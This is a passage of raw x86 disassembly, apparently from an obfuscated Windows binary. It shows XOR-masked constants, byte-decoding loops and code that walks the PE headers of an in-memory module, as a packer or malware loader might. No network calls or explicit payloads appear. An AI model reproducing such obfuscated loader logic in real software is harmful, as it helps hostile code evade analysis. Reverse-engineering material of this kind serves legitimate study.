  41da5a:	sub    ecx,eax
  41da5c:	add    ecx,DWORD PTR [ebp-0x14]
  41da5f:	mov    DWORD PTR [ebp+0x8],ecx
  41da62:	mov    DWORD PTR [ebp-0x8],0xf89c85bc
  41da69:	jmp    0x41db6d
  41da6e:	mov    eax,DWORD PTR [ebp+0xc]
  41da71:	mov    ecx,DWORD PTR [ebp+0xc]
  41da74:	xor    eax,esi
  41da76:	xor    ecx,esi
  41da78:	lea    ecx,[eax+ecx*1+0x64e5c0]
  41da7f:	mov    eax,DWORD PTR [ebp+0x8]
  41da82:	xor    edx,edx
  41da84:	div    ecx
  41da86:	mov    eax,DWORD PTR [ebp+0x10]
  41da89:	mov    ecx,DWORD PTR [ebp+0xc]
  41da8c:	xor    eax,esi
  41da8e:	xor    ecx,esi
  41da90:	sub    eax,ecx
  41da92:	cmp    edx,eax
  41da94:	jne    0x41db29
  41da9a:	mov    eax,DWORD PTR [ebp+0x8]
  41da9d:	add    eax,DWORD PTR [ebp-0xc]
  41daa0:	mov    dl,BYTE PTR [eax]
  41daa2:	mov    eax,DWORD PTR [ebp-0x10]
  41daa5:	mov    ecx,DWORD PTR [ebp-0x8]
  41daa8:	xor    eax,esi
  41daaa:	xor    ecx,esi
  41daac:	add    eax,edi
  41daae:	add    ecx,edi
  41dab0:	cmp    eax,ecx
  41dab2:	jae    0x41dafa
  41dab4:	lea    ecx,[eax-0x3272e0]
  41daba:	mov    DWORD PTR [ebp-0x4],ecx
  41dabd:	mov    ebx,DWORD PTR [ebp-0x4]
  41dac0:	xor    ebx,esi
  41dac2:	add    ebx,0x7f55d8fb
  41dac8:	lea    ecx,[ebp+eax*4-0x38]
  41dacc:	mov    DWORD PTR [ecx],ebx
  41dace:	mov    ebx,DWORD PTR [ecx]
  41dad0:	cmp    ebx,0x244ecbda
  41dad6:	jbe    0x41dae0
  41dad8:	add    DWORD PTR [ecx],0x405fc1d
  41dade:	jmp    0x41dae6
  41dae0:	add    DWORD PTR [ecx],0xfdaf43e3
  41dae6:	mov    ecx,DWORD PTR [ebp-0x8]
  41dae9:	xor    ecx,esi
  41daeb:	inc    eax
  41daec:	inc    DWORD PTR [ebp-0x4]
  41daef:	add    ecx,edi
  41daf1:	cmp    eax,ecx
  41daf3:	jb     0x41dabd
  41daf5:	mov    ebx,0xf89c85b9
  41dafa:	mov    eax,DWORD PTR [ebp-0x18]
  41dafd:	test   eax,eax
  41daff:	jne    0x41db09
  41db01:	xor    dl,0x73
  41db04:	sub    dl,0x9
  41db07:	jmp    0x41db1f
  41db09:	mov    eax,DWORD PTR [ebp-0x1c]
  41db0c:	xor    al,0x99
  41db0e:	mov    cl,0x20
  41db10:	sub    cl,al
  41db12:	add    dl,cl
  41db14:	mov    ecx,DWORD PTR [ebp-0x20]
  41db17:	xor    cl,0x99
  41db1a:	sub    cl,0x20
  41db1d:	ror    dl,cl
  41db1f:	xor    eax,eax
  41db21:	mov    eax,DWORD PTR [ebp+0x8]
  41db24:	add    eax,DWORD PTR [ebp-0xc]
  41db27:	mov    BYTE PTR [eax],dl
  41db29:	mov    eax,DWORD PTR [ebp+0x8]
  41db2c:	mov    ecx,DWORD PTR [ebp-0x10]
  41db2f:	sub    eax,edi
  41db31:	xor    eax,esi
  41db33:	cmp    eax,ecx
  41db35:	jne    0x41db5b
  41db37:	mov    eax,DWORD PTR [ebp+0x10]
  41db3a:	mov    ecx,DWORD PTR [ebp+0xc]
  41db3d:	xor    eax,esi
  41db3f:	xor    ecx,esi
  41db41:	sub    eax,ecx
  41db43:	sub    eax,edi
  41db45:	xor    eax,esi
  41db47:	mov    DWORD PTR [ebp+0x10],eax
  41db4a:	mov    eax,DWORD PTR [ebp+0xc]
  41db4d:	xor    eax,esi
  41db4f:	mov    ecx,0xffcd8d20
  41db54:	sub    ecx,eax
  41db56:	add    ecx,DWORD PTR [ebp-0x14]
  41db59:	jmp    0x41db6a
  41db5b:	mov    eax,DWORD PTR [ebp+0xc]
  41db5e:	xor    eax,esi
  41db60:	mov    ecx,0xffcd8d20
  41db65:	sub    ecx,eax
  41db67:	add    ecx,DWORD PTR [ebp+0x8]
  41db6a:	mov    DWORD PTR [ebp+0x8],ecx
  41db6d:	mov    eax,DWORD PTR [ebp+0x10]
  41db70:	cmp    eax,ebx
  41db72:	jne    0x41da6e
  41db78:	mov    eax,DWORD PTR [ebp-0x24]
  41db7b:	jmp    0x41db80
  41db7d:	mov    eax,DWORD PTR [ebp-0x4]
  41db80:	xor    eax,esi
  41db82:	add    eax,edi
  41db84:	pop    edi
  41db85:	pop    esi
  41db86:	pop    ebx
  41db87:	leave  
  41db88:	ret    0xc
  41db8b:	push   ebp
  41db8c:	mov    ebp,esp
  41db8e:	sub    esp,0x14
  41db91:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  41db98:	mov    DWORD PTR [ebp-0x4],0xf89c85b8
  41db9f:	mov    eax,DWORD PTR [ebx]
  41dba1:	mov    DWORD PTR [ebp-0x8],eax
  41dba4:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  41dbab:	push   esi
  41dbac:	push   edi
  41dbad:	mov    DWORD PTR [ebp-0x14],0xead718d9
  41dbb4:	mov    edi,DWORD PTR [ebp-0x4]
  41dbb7:	mov    ecx,DWORD PTR [ebp-0x10]
  41dbba:	mov    eax,0x7510899
  41dbbf:	xor    edi,eax
  41dbc1:	mov    edx,0x3272e0
  41dbc6:	xor    ecx,eax
  41dbc8:	add    edi,edx
  41dbca:	add    ecx,edx
  41dbcc:	imul   edi,ecx
  41dbcf:	jmp    0x41dc17
  41dbd1:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbd4:	mov    esi,DWORD PTR [ebp-0x4]
  41dbd7:	xor    ecx,eax
  41dbd9:	xor    esi,eax
  41dbdb:	add    ecx,edx
  41dbdd:	add    esi,edx
  41dbdf:	test   esi,ecx
  41dbe1:	mov    esi,DWORD PTR [ebp-0x8]
  41dbe4:	mov    ecx,DWORD PTR [ebp-0x4]
  41dbe7:	je     0x41dbfe
  41dbe9:	xor    ecx,eax
  41dbeb:	xor    esi,eax
  41dbed:	add    ecx,edx
  41dbef:	add    esi,edx
  41dbf1:	shr    esi,cl
  41dbf3:	mov    ecx,DWORD PTR [ebp-0x14]
  41dbf6:	xor    ecx,eax
  41dbf8:	add    ecx,edx
  41dbfa:	xor    esi,ecx
  41dbfc:	jmp    0x41dc08
  41dbfe:	xor    esi,eax
  41dc00:	xor    ecx,eax
  41dc02:	add    esi,edx
  41dc04:	add    ecx,edx
  41dc06:	shr    esi,cl
  41dc08:	mov    DWORD PTR [ebp-0x8],esi
  41dc0b:	mov    ecx,DWORD PTR [ebp-0x4]
  41dc0e:	xor    ecx,eax
  41dc10:	lea    edi,[edi+ecx*1+0x3272e0]
  41dc17:	mov    ecx,DWORD PTR [ebp-0xc]
  41dc1a:	mov    esi,DWORD PTR [ebp-0x4]
  41dc1d:	xor    esi,eax
  41dc1f:	xor    ecx,eax
  41dc21:	sub    ecx,esi
  41dc23:	cmp    edi,ecx
  41dc25:	jbe    0x41dbd1
  41dc27:	mov    eax,DWORD PTR [ebp-0x8]
  41dc2a:	pop    edi
  41dc2b:	mov    DWORD PTR [ebx],eax
  41dc2d:	mov    eax,DWORD PTR [ebp-0x8]
  41dc30:	pop    esi
  41dc31:	leave  
  41dc32:	ret    
  41dc33:	push   ebp
  41dc34:	mov    ebp,esp
  41dc36:	sub    esp,0x420
  41dc3c:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  41dc43:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  41dc4a:	mov    DWORD PTR [ebp-0x18],0xf89c86b9
  41dc51:	push   ebx
  41dc52:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41dc59:	mov    eax,DWORD PTR [ebp-0x14]
  41dc5c:	push   esi
  41dc5d:	mov    esi,0x7510899
  41dc62:	push   edi
  41dc63:	xor    eax,esi
  41dc65:	mov    edi,0x3272e0
  41dc6a:	add    eax,edi
  41dc6c:	mov    DWORD PTR [ebp-0x8],eax
  41dc6f:	mov    DWORD PTR [ebp-0x20],0xf89c85b1
  41dc76:	mov    DWORD PTR [ebp-0x4],0xead718d9
  41dc7d:	mov    DWORD PTR [ebp-0x10],0x8
  41dc84:	mov    ecx,ecx
  41dc86:	mov    eax,DWORD PTR [ebp-0xc]
  41dc89:	mov    ecx,DWORD PTR [ebp-0x14]
  41dc8c:	xor    eax,esi
  41dc8e:	xor    ecx,esi
  41dc90:	add    eax,edi
  41dc92:	add    ecx,edi
  41dc94:	imul   eax,ecx
  41dc97:	jmp    0x41dcca
  41dc99:	mov    eax,DWORD PTR [ebp-0x4]
  41dc9c:	sub    eax,edi
  41dc9e:	xor    eax,esi
  41dca0:	mov    DWORD PTR [ebp-0x8],eax
  41dca3:	lea    ebx,[ebp-0x8]
  41dca6:	call   0x41db8b
  41dcab:	mov    DWORD PTR [ebp-0x8],eax
  41dcae:	mov    eax,DWORD PTR [ebp-0x8]
  41dcb1:	mov    ecx,DWORD PTR [ebp-0x4]
  41dcb4:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  41dcbb:	mov    eax,DWORD PTR [ebp-0xc]
  41dcbe:	mov    ecx,DWORD PTR [ebp-0x4]
  41dcc1:	xor    eax,esi
  41dcc3:	lea    eax,[eax+ecx*1+0x3272e0]
  41dcca:	mov    DWORD PTR [ebp-0x4],eax
  41dccd:	mov    eax,DWORD PTR [ebp-0x18]
  41dcd0:	mov    ecx,DWORD PTR [ebp-0xc]
  41dcd3:	xor    ecx,esi
  41dcd5:	xor    eax,esi
  41dcd7:	sub    eax,ecx
  41dcd9:	mov    ecx,DWORD PTR [ebp-0x4]
  41dcdc:	cmp    ecx,eax
  41dcde:	jbe    0x41dc99
  41dce0:	mov    eax,DWORD PTR [ebp-0x1c]
  41dce3:	xor    eax,esi
  41dce5:	add    eax,edi
  41dce7:	mov    DWORD PTR [ebp-0x8],eax
  41dcea:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  41dcf1:	mov    ebx,ebx
  41dcf3:	jmp    0x41dd56
  41dcf5:	mov    ecx,DWORD PTR [ebp-0x20]
  41dcf8:	mov    eax,DWORD PTR [ebp-0x8]
  41dcfb:	xor    ecx,esi
  41dcfd:	add    ecx,edi
  41dcff:	shr    eax,cl
  41dd01:	mov    DWORD PTR [ebp-0x4],eax
  41dd04:	mov    eax,DWORD PTR [ebp+0x8]
  41dd07:	mov    cl,BYTE PTR [eax]
  41dd09:	mov    BYTE PTR [ebp+0xb],cl
  41dd0c:	mov    cl,BYTE PTR [ebp+0xb]
  41dd0f:	mov    edx,DWORD PTR [ebp-0x8]
  41dd12:	movzx  ecx,cl
  41dd15:	xor    ecx,edx
  41dd17:	mov    DWORD PTR [ebp+0x8],ecx
  41dd1a:	mov    ecx,DWORD PTR [ebp-0x18]
  41dd1d:	mov    edx,DWORD PTR [ebp+0x8]
  41dd20:	xor    ecx,esi
  41dd22:	add    ecx,edi
  41dd24:	and    ecx,edx
  41dd26:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  41dd2d:	mov    edx,DWORD PTR [ebp-0x4]
  41dd30:	xor    ecx,edx
  41dd32:	mov    DWORD PTR [ebp-0x8],ecx
  41dd35:	mov    ecx,DWORD PTR [ebp-0xc]
  41dd38:	xor    ecx,esi
  41dd3a:	lea    eax,[eax+ecx*1+0x3272e0]
  41dd41:	mov    DWORD PTR [ebp+0x8],eax
  41dd44:	mov    eax,DWORD PTR [ebp-0xc]
  41dd47:	xor    eax,esi
  41dd49:	mov    ecx,0xffcd8d20
  41dd4e:	sub    ecx,eax
  41dd50:	add    ecx,DWORD PTR [ebp-0x10]
  41dd53:	mov    DWORD PTR [ebp-0x10],ecx
  41dd56:	mov    eax,DWORD PTR [ebp-0x14]
  41dd59:	mov    ecx,DWORD PTR [ebp-0x10]
  41dd5c:	xor    eax,esi
  41dd5e:	add    eax,edi
  41dd60:	cmp    ecx,eax
  41dd62:	jne    0x41dcf5
  41dd64:	mov    eax,DWORD PTR [ebp-0x1c]
  41dd67:	mov    ecx,DWORD PTR [ebp-0x8]
  41dd6a:	xor    eax,esi
  41dd6c:	add    eax,edi
  41dd6e:	pop    edi
  41dd6f:	pop    esi
  41dd70:	xor    eax,ecx
  41dd72:	pop    ebx
  41dd73:	leave  
  41dd74:	ret    0x4
  41dd77:	push   ebp
  41dd78:	mov    ebp,esp
  41dd7a:	mov    eax,DWORD PTR [ebp+0x1c]
  41dd7d:	mov    ecx,DWORD PTR [ebp+0x8]
  41dd80:	mov    edx,DWORD PTR [ebp+0x10]
  41dd83:	mov    eax,DWORD PTR [eax+0x190]
  41dd89:	mov    eax,DWORD PTR [eax]
  41dd8b:	sub    esp,0x64
  41dd8e:	push   ebx
  41dd8f:	push   esi
  41dd90:	push   edi
  41dd91:	mov    edi,0x7510899
  41dd96:	xor    ecx,edi
  41dd98:	mov    ebx,0x3272e0
  41dd9d:	add    ecx,ebx
  41dd9f:	cmp    ecx,edx
  41dda1:	jne    0x41ddb2
  41dda3:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  41ddad:	jmp    0x41e2ae
  41ddb2:	mov    ecx,DWORD PTR [ebp+0x8]
  41ddb5:	mov    esi,DWORD PTR [ebp+0x14]
  41ddb8:	mov    edx,DWORD PTR [esi]
  41ddba:	xor    ecx,edi
  41ddbc:	add    ecx,ebx
  41ddbe:	cmp    edx,ecx
  41ddc0:	je     0x41e269
  41ddc6:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ddc9:	mov    DWORD PTR [ebp-0x1c],eax
  41ddcc:	mov    DWORD PTR [ebp+0x1c],ecx
  41ddcf:	mov    ecx,DWORD PTR [ebp+0x18]
  41ddd2:	mov    eax,DWORD PTR [esi]
  41ddd4:	mov    DWORD PTR [ebp-0x20],eax
  41ddd7:	mov    DWORD PTR [ebp+0x8],0xf89c85b9
  41ddde:	mov    edx,0xf89c85b8
  41dde3:	mov    DWORD PTR [ebp-0x8],edx
  41dde6:	mov    eax,DWORD PTR [ebp+0x1c]
  41dde9:	mov    DWORD PTR [ebp+0x1c],eax
  41ddec:	mov    eax,DWORD PTR [ebp+0x1c]
  41ddef:	mov    eax,DWORD PTR [eax+0x190]
  41ddf5:	mov    eax,DWORD PTR [eax]
  41ddf7:	mov    DWORD PTR [ebp-0x24],ecx
  41ddfa:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ddfd:	mov    ecx,DWORD PTR [ecx+0x190]
  41de03:	mov    ecx,DWORD PTR [ecx]
  41de05:	add    ecx,DWORD PTR [eax+0x3c]
  41de08:	mov    DWORD PTR [ebp+0x10],ecx
  41de0b:	mov    eax,DWORD PTR [ebp+0x8]
  41de0e:	xor    eax,edi
  41de10:	add    eax,ebx
  41de12:	mov    DWORD PTR [ebp-0x4],eax
  41de15:	mov    eax,DWORD PTR [ebp+0x8]
  41de18:	xor    eax,edi
  41de1a:	add    eax,ebx
  41de1c:	mov    DWORD PTR [ebp+0x18],eax
  41de1f:	mov    eax,DWORD PTR [ebp+0x10]
  41de22:	mov    eax,DWORD PTR [eax+0x50]
  41de25:	sub    eax,0xc
  41de28:	mov    DWORD PTR [ebp-0x28],eax
  41de2b:	mov    eax,DWORD PTR [ebp+0x10]
  41de2e:	mov    eax,DWORD PTR [eax+0x38]
  41de31:	mov    ecx,DWORD PTR [ebp+0x10]
  41de34:	dec    eax
  41de35:	test   DWORD PTR [ecx+0x54],eax
  41de38:	mov    eax,DWORD PTR [ebp+0x10]
  41de3b:	je     0x41de55
  41de3d:	mov    eax,DWORD PTR [eax+0x38]
  41de40:	mov    ecx,DWORD PTR [ebp+0x10]
  41de43:	mov    ecx,DWORD PTR [ecx+0x54]
  41de46:	dec    eax
  41de47:	not    eax
  41de49:	and    ecx,eax
  41de4b:	mov    eax,DWORD PTR [ebp+0x10]
  41de4e:	mov    eax,DWORD PTR [eax+0x38]
  41de51:	add    eax,ecx
  41de53:	jmp    0x41de58
  41de55:	mov    eax,DWORD PTR [eax+0x54]
  41de58:	mov    DWORD PTR [ebp+0x1c],eax
  41de5b:	mov    eax,DWORD PTR [ebp+0x8]
  41de5e:	xor    eax,edi
  41de60:	add    eax,ebx
  41de62:	mov    DWORD PTR [ebp+0x18],eax
  41de65:	mov    eax,DWORD PTR [ebp+0x8]
  41de68:	xor    eax,edi
  41de6a:	add    eax,ebx
  41de6c:	mov    DWORD PTR [ebp+0x18],eax
  41de6f:	mov    eax,DWORD PTR [ebp+0x8]
  41de72:	mov    ecx,DWORD PTR [ebp-0x24]
  41de75:	xor    eax,edi
  41de77:	add    eax,ebx
  41de79:	mov    DWORD PTR [ecx],eax
  41de7b:	mov    DWORD PTR [ebp+0x18],edx
  41de7e:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  41de85:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  41de8c:	mov    DWORD PTR [ebp+0x18],0xf89c85bd
  41de93:	mov    eax,DWORD PTR [ebp-0x8]
  41de96:	mov    ecx,DWORD PTR [ebp+0x1c]
  41de99:	xor    eax,edi
  41de9b:	add    eax,ebx
  41de9d:	imul   eax,ecx
  41dea0:	mov    ecx,DWORD PTR [ebp+0x8]
  41dea3:	mov    edx,DWORD PTR [ebp-0x28]
  41dea6:	xor    ecx,edi
  41dea8:	lea    ecx,[ecx+edx*1+0x3272e0]
  41deaf:	cmp    eax,ecx
  41deb1:	jae    0x41e262
  41deb7:	mov    eax,DWORD PTR [ebp+0x8]
  41deba:	xor    eax,edi
  41debc:	add    eax,ebx
  41debe:	mov    DWORD PTR [ebp+0x18],eax
  41dec1:	mov    eax,DWORD PTR [ebp+0x1c]
  41dec4:	add    eax,DWORD PTR [ebp-0x1c]
  41dec7:	mov    DWORD PTR [ebp-0x4],eax
  41deca:	push   DWORD PTR [ebp-0x4]
  41decd:	mov    esi,DWORD PTR [ebp-0x1c]
  41ded0:	mov    ecx,DWORD PTR [ebp+0x10]
  41ded3:	call   0x41cfcb
  41ded8:	mov    DWORD PTR [ebp+0xc],eax
  41dedb:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  41dee2:	mov    eax,DWORD PTR [ebp-0x18]
  41dee5:	xor    eax,edi
  41dee7:	lea    ecx,[ebp-0x40]
  41deea:	add    eax,ebx
  41deec:	push   ecx
  41deed:	call   0x41d5ae
  41def2:	mov    eax,DWORD PTR [ebp+0xc]
  41def5:	test   eax,eax
  41def7:	je     0x41df47
  41def9:	mov    eax,DWORD PTR [ebp-0x18]
  41defc:	xor    eax,edi
  41defe:	add    eax,ebx
  41df00:	push   eax
  41df01:	push   DWORD PTR [ebp+0xc]
  41df04:	lea    eax,[ebp-0x40]
  41df07:	push   eax
  41df08:	call   0x41d455
  41df0d:	mov    eax,DWORD PTR [ebp-0x4]
  41df10:	mov    DWORD PTR [ebp-0x18],eax
  41df13:	mov    eax,DWORD PTR [ebp-0x18]
  41df16:	mov    ecx,DWORD PTR [ebp-0x1c]
  41df19:	sub    eax,ecx
  41df1b:	mov    DWORD PTR [ebp-0x18],eax
  41df1e:	mov    eax,DWORD PTR [ebp+0xc]
  41df21:	mov    ecx,DWORD PTR [ebp+0xc]
  41df24:	mov    eax,DWORD PTR [eax+0x10]
  41df27:	add    eax,DWORD PTR [ecx+0xc]
  41df2a:	mov    ecx,DWORD PTR [ebp-0x18]
  41df2d:	cmp    ecx,eax
  41df2f:	jb     0x41df47
  41df31:	mov    eax,DWORD PTR [ebp+0xc]
  41df34:	mov    eax,DWORD PTR [eax+0xc]
  41df37:	mov    ecx,DWORD PTR [ebp+0xc]
  41df3a:	add    eax,DWORD PTR [ecx+0x8]
  41df3d:	mov    ecx,DWORD PTR [ebp-0x18]
  41df40:	sub    eax,ecx
  41df42:	jmp    0x41e235
  41df47:	push   0xc
  41df49:	push   DWORD PTR [ebp-0x4]
  41df4c:	lea    eax,[ebp-0x4c]
  41df4f:	push   eax
  41df50:	call   0x41d455
  41df55:	mov    eax,0xf89c85b9
  41df5a:	mov    DWORD PTR [ebp-0x2c],eax
  41df5d:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  41df64:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  41df6b:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  41df72:	lea    ecx,[ebp-0x2c]
  41df75:	mov    DWORD PTR [ebp-0xc],ecx
  41df78:	lea    ecx,[ebp-0x30]
  41df7b:	mov    DWORD PTR [ebp-0x10],ecx
  41df7e:	lea    ecx,[ebp-0x34]
  41df81:	mov    DWORD PTR [ebp+0xc],ecx
  41df84:	lea    ecx,[ebp-0x38]
  41df87:	mov    DWORD PTR [ebp-0x14],ecx
  41df8a:	mov    ecx,DWORD PTR [ebp+0x8]
  41df8d:	xor    ecx,edi
  41df8f:	add    ecx,ebx
  41df91:	mov    DWORD PTR [ebp-0x18],ecx
  41df94:	jmp    0x41e190
  41df99:	cmp    eax,0xf89c85bb
  41df9e:	je     0x41e1a2
  41dfa4:	mov    ecx,DWORD PTR [ebp-0x8]
  41dfa7:	xor    ecx,edi
  41dfa9:	mov    esi,eax
  41dfab:	add    ecx,ebx
  41dfad:	mov    DWORD PTR [ebp+0x18],ecx
  41dfb0:	mov    eax,DWORD PTR [ebp-0x18]
  41dfb3:	xor    esi,edi
  41dfb5:	lea    eax,[eax+esi*1+0x3272e0]
  41dfbc:	mov    DWORD PTR [ebp-0x18],eax
  41dfbf:	mov    eax,DWORD PTR [ebp-0x8]
  41dfc2:	mov    ecx,DWORD PTR [ebp-0x18]
  41dfc5:	xor    eax,edi
  41dfc7:	add    eax,ebx
  41dfc9:	cmp    ecx,eax
  41dfcb:	jne    0x41dfe0
  41dfcd:	mov    eax,DWORD PTR [ebp+0x8]
  41dfd0:	xor    eax,edi
  41dfd2:	add    eax,ebx
  41dfd4:	push   eax
  41dfd5:	push   0xc
  41dfd7:	lea    eax,[ebp-0x4c]
  41dfda:	push   eax
  41dfdb:	call   0x41d9e2
  41dfe0:	mov    eax,DWORD PTR [ebp-0xc]
  41dfe3:	mov    eax,DWORD PTR [eax]
  41dfe5:	xor    eax,edi
  41dfe7:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41dfee:	mov    ecx,DWORD PTR [ebp+0x8]
  41dff1:	xor    ecx,edi
  41dff3:	movzx  eax,al
  41dff6:	add    ecx,ebx
  41dff8:	cmp    eax,ecx
  41dffa:	je     0x41e178
  41e000:	mov    eax,DWORD PTR [ebp-0x10]
  41e003:	mov    eax,DWORD PTR [eax]
  41e005:	xor    eax,edi
  41e007:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e00e:	mov    ecx,DWORD PTR [ebp+0x8]
  41e011:	xor    ecx,edi
  41e013:	movzx  eax,al
  41e016:	add    ecx,ebx
  41e018:	cmp    eax,ecx
  41e01a:	je     0x41e178
  41e020:	mov    eax,DWORD PTR [ebp+0xc]
  41e023:	mov    eax,DWORD PTR [eax]
  41e025:	xor    eax,edi
  41e027:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e02e:	mov    ecx,DWORD PTR [ebp+0x8]
  41e031:	xor    ecx,edi
  41e033:	movzx  eax,al
  41e036:	add    ecx,ebx
  41e038:	cmp    eax,ecx
  41e03a:	je     0x41e178
  41e040:	mov    eax,DWORD PTR [ebp-0x14]
  41e043:	mov    eax,DWORD PTR [eax]
  41e045:	xor    eax,edi
  41e047:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e04e:	mov    ecx,DWORD PTR [ebp+0x8]
  41e051:	xor    ecx,edi
  41e053:	movzx  eax,al
  41e056:	add    ecx,ebx
  41e058:	cmp    eax,ecx
  41e05a:	je     0x41e178
  41e060:	mov    eax,DWORD PTR [ebp-0x10]
  41e063:	mov    eax,DWORD PTR [eax]
  41e065:	xor    eax,edi
  41e067:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e06e:	mov    ecx,DWORD PTR [ebp-0xc]
  41e071:	mov    ecx,DWORD PTR [ecx]
  41e073:	xor    ecx,edi
  41e075:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e07c:	xor    al,cl
  41e07e:	mov    ecx,DWORD PTR [ebp+0xc]
  41e081:	mov    ecx,DWORD PTR [ecx]
  41e083:	xor    ecx,edi
  41e085:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e08c:	or     al,cl
  41e08e:	mov    ecx,DWORD PTR [ebp-0xc]
  41e091:	mov    ecx,DWORD PTR [ecx]
  41e093:	xor    ecx,edi
  41e095:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  41e09c:	cmp    cl,al
  41e09e:	jne    0x41e178
  41e0a4:	mov    eax,DWORD PTR [ebp+0xc]
  41e0a7:	mov    eax,DWORD PTR [eax]
  41e0a9:	xor    eax,edi
  41e0ab:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e0b2:	mov    ecx,DWORD PTR [ebp-0x10]
  41e0b5:	mov    ecx,DWORD PTR [ecx]
  41e0b7:	xor    ecx,edi
  41e0b9:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e0c0:	xor    al,cl
  41e0c2:	mov    ecx,DWORD PTR [ebp-0x14]
  41e0c5:	mov    ecx,DWORD PTR [ecx]
  41e0c7:	xor    ecx,edi
  41e0c9:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e0d0:	or     al,cl
  41e0d2:	mov    ecx,DWORD PTR [ebp-0x10]
  41e0d5:	mov    ecx,DWORD PTR [ecx]
  41e0d7:	xor    ecx,edi
  41e0d9:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  41e0e0:	cmp    cl,al
  41e0e2:	jne    0x41e178
  41e0e8:	mov    eax,DWORD PTR [ebp-0x14]
  41e0eb:	mov    eax,DWORD PTR [eax]
  41e0ed:	xor    eax,edi
  41e0ef:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e0f6:	mov    ecx,DWORD PTR [ebp+0xc]
  41e0f9:	mov    ecx,DWORD PTR [ecx]
  41e0fb:	xor    ecx,edi
  41e0fd:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e104:	xor    al,cl
  41e106:	mov    ecx,DWORD PTR [ebp-0xc]
  41e109:	mov    ecx,DWORD PTR [ecx]
  41e10b:	xor    ecx,edi
  41e10d:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e114:	or     al,cl
  41e116:	mov    ecx,DWORD PTR [ebp+0xc]
  41e119:	mov    ecx,DWORD PTR [ecx]
  41e11b:	xor    ecx,edi
  41e11d:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  41e124:	cmp    cl,al
  41e126:	jne    0x41e178
  41e128:	mov    eax,DWORD PTR [ebp-0x14]
  41e12b:	mov    eax,DWORD PTR [eax]
  41e12d:	xor    eax,edi
  41e12f:	mov    al,BYTE PTR [ebp+eax*1+0x327294]
  41e136:	mov    ecx,DWORD PTR [ebp-0xc]
  41e139:	mov    ecx,DWORD PTR [ecx]
  41e13b:	xor    ecx,edi
  41e13d:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e144:	xor    al,cl
  41e146:	mov    ecx,DWORD PTR [ebp-0x10]
  41e149:	mov    ecx,DWORD PTR [ecx]
  41e14b:	xor    ecx,edi
  41e14d:	mov    cl,BYTE PTR [ebp+ecx*1+0x327294]
  41e154:	or     al,cl
  41e156:	mov    ecx,DWORD PTR [ebp-0x14]
  41e159:	mov    ecx,DWORD PTR [ecx]
  41e15b:	xor    ecx,edi
  41e15d:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  41e164:	cmp    cl,al
  41e166:	jne    0x41e178
  41e168:	lea    eax,[ebp-0x4c]
  41e16b:	push   eax
  41e16c:	call   0x41dc33
  41e171:	mov    ecx,DWORD PTR [ebp-0x44]
  41e174:	cmp    eax,ecx
  41e176:	je     0x41e182
  41e178:	mov    eax,DWORD PTR [ebp+0x8]
  41e17b:	xor    eax,edi
  41e17d:	add    eax,ebx
  41e17f:	mov    DWORD PTR [ebp+0x18],eax
  41e182:	mov    eax,DWORD PTR [ebp-0x8]
  41e185:	xor    eax,edi
  41e187:	lea    eax,[eax+esi*1+0x3272e0]
  41e18e:	xor    eax,edi
  41e190:	mov    ecx,DWORD PTR [ebp+0x8]
  41e193:	mov    edx,DWORD PTR [ebp+0x18]
  41e196:	xor    ecx,edi
  41e198:	add    ecx,ebx
  41e19a:	cmp    edx,ecx
  41e19c:	je     0x41df99
  41e1a2:	mov    eax,DWORD PTR [ebp+0x8]
  41e1a5:	mov    ecx,DWORD PTR [ebp+0x18]
  41e1a8:	xor    eax,edi
  41e1aa:	add    eax,ebx
  41e1ac:	cmp    ecx,eax
  41e1ae:	jne    0x41e1c1
  41e1b0:	mov    eax,DWORD PTR [ebp-0x8]
  41e1b3:	mov    ecx,DWORD PTR [ebp+0x1c]
  41e1b6:	xor    eax,edi
  41e1b8:	lea    eax,[eax+ecx*1+0x3272e0]
  41e1bf:	jmp    0x41e238
  41e1c1:	push   0x18
  41e1c3:	push   DWORD PTR [ebp-0x4]
  41e1c6:	lea    eax,[ebp-0x64]
  41e1c9:	push   eax
  41e1ca:	call   0x41d455
  41e1cf:	mov    eax,DWORD PTR [ebp+0x8]
  41e1d2:	mov    ecx,DWORD PTR [ebp-0x18]
  41e1d5:	xor    eax,edi
  41e1d7:	add    eax,ebx
  41e1d9:	cmp    eax,ecx
  41e1db:	je     0x41e1f0
  41e1dd:	mov    eax,DWORD PTR [ebp+0x8]
  41e1e0:	xor    eax,edi
  41e1e2:	add    eax,ebx
  41e1e4:	push   eax
  41e1e5:	push   0x18
  41e1e7:	lea    eax,[ebp-0x64]
  41e1ea:	push   eax
